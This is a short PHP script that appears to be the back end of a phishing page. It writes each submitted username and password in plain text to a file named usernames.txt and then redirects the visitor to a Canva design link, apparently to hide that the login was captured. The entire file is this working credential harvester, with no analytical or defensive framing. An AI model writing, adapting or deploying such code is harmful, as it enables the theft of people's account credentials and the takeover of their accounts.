<?php

file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.canva.com/design/DAGJzoHCmgc/5CfqC8siIn25Uiti5Iilww/view?utm_content=DAGJzoHCmgc&utm_campaign=designshare&utm_medium=link&utm_source=editor');
exit();
